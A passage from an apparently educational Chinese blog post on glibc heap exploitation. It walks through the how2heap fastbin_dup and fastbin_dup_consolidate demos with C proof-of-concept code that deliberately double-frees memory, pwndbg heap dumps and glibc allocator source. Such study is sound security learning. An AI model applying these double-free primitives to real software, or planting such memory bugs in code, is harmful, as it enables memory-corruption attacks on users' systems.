class="hljs-keyword">one</span>...<br>If we <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07010</span> again<span class="hljs-punctuation">,</span> things will crash because <span class="hljs-number">0xd07010</span> is at the top of the <span class="hljs-keyword">free</span> list.<br>So<span class="hljs-punctuation">,</span> instead<span class="hljs-punctuation">,</span> we&#x27;ll <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07030</span>.<br>Now<span class="hljs-punctuation">,</span> we can <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07010</span> again<span class="hljs-punctuation">,</span> since it&#x27;s not the head of the <span class="hljs-keyword">free</span> list.<br>Now the <span class="hljs-keyword">free</span> list has [ <span class="hljs-number">0xd07010</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0xd07030</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0xd07010</span> ]. If we <span class="hljs-keyword">malloc</span> <span class="hljs-number">3</span> times<span class="hljs-punctuation">,</span> we&#x27;ll get <span class="hljs-number">0xd07010</span> twice!<br><span class="hljs-number">1</span>st <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br><span class="hljs-number">2</span>nd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07030</span><br><span class="hljs-number">3</span>rd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br></code></pre></td></tr></table></figure><h2 id="关键部分调试-1"><a href="#关键部分调试-1" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>这里我们一共下4个断点,分别在每次free前和最后分配的时候</p><p>首先看看没free前的堆</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fa1</span><br>&#125;<br><span class="hljs-number">0x602060</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135073</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到一共三块空间a,b,c<br>然后我们先free a</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>然后free b</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602020 —▸ <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>然后再free a</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x602020 ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>可以看到已经构成了一个chunk 环即a-&gt;b-&gt;a,然后我们再分配空间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3rd</span> malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0</span>x602010\n0x602010, <span class="hljs-number">0</span>x602030, <span class="hljs-number">0</span>x602010 ]. If we malloc <span class="hljs-number">3</span> times, we&#x27;ll get <span class="hljs-number">0</span>x602010 twice!\<br></code></pre></td></tr></table></figure><p>成功分配了两次a的空间</p><p><em>注:这里要注意mem内存指针和chunk指针不一样,mem内存指针也就是给用户的内存指针,并不是chunk头指针</em></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了三块内存a,b,c</p><p>然后先释放a,再释放b,最后再释放一次a</p><p>此时的free list为a-&gt;b-&gt;a</p><p>然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了</p><p>而fastbin 的 double free为什么能成功呢?</p><p>这里借用<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/">ctf-wiki</a>的一段话:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf">fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。<br><br><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">__builtin_expect</span> (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-built_in">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以只要不是连续释放同一个堆块即可,想要验证的同学可以把文中注释掉free(a)的那一行取消注释编译运行一下:-)</p><h1 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now free p1!\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-comment">//分配一个large bin来触发malloc_consolidate函数</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-comment">//通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin中</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  ##然后就可以触发<span class="hljs-type">double</span> free漏洞了<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Trigger the double free vulnerability!\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);<br>  <span class="hljs-comment">//现在p1既在unsorted bin中又在fastbin中,因此我们再分配两次p1大小的内存,就可以分配到同一款内存</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">Allocated two fastbins: p1=0x14ba010 p2=0x14ba060<br>Now free p1!<br>Allocated large bin to trigger malloc_consolidate(): p3=0x14ba0b0<br>In malloc_consolidate(), p1 is moved to the unsorted bin.<br>Trigger the<span class="hljs-built_in"> double </span>free vulnerability!<br>We can pass the<span class="hljs-built_in"> check </span>in malloc() since p1 is<span class="hljs-built_in"> not </span>fast top.<br>Now p1 is in unsorted bin<span class="hljs-built_in"> and </span>fast bin. So we&#x27;will get it twice: 0x14ba010 0x14ba010<br></code></pre></td></tr></table></figure><h2 id="关键部分调试-2"><a href="#关键部分调试-2" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><p>这里我们把断点下在第一次free p1 ,malloc p3,第二次free p1和最后的分配内存部分,也就是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Line</span> number <span class="hljs-number">20</span> out of range; glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c has <span class="hljs-number">19</span> lines.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">11</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">1</span> at <span class="hljs-number">0</span>x4006b6: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">11</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">13</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">2</span> at <span class="hljs-number">0</span>x4006c4: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">13</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">16</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">3</span> at <span class="hljs-number">0</span>x40070b: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">16</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">19</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">4</span> at <span class="hljs-number">0</span>x400782: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">19</span>.<br></code></pre></td></tr></table></figure><p>之后我们运行一下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">135009</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到此时的p1被放到了fastbin中,然后我们malloc一个0x400的大chunk,这样就会触发malloc_consolidate()</p><p>此时的堆</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1041</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6024b0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133969</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bb8 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span>) ◂— <span class="hljs-number">0</span>x602000<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>这个时候,我们之前free掉的chunk已经被放进了small bin中</p><h3 id="part-2"><a href="#part-2" class="headerlink" title="part 2"></a>part 2</h3><p><strong>划重点,这个过程中到底发生了什么呢?</strong></p><ol><li>问题一:啥是malloc_consolidate函数??</li></ol><p>我们直接看源代码吧</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs xl">   static void malloc_consolidate(mstate av)<br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  int             nextinuse;<br>  <span class="hljs-function"><span 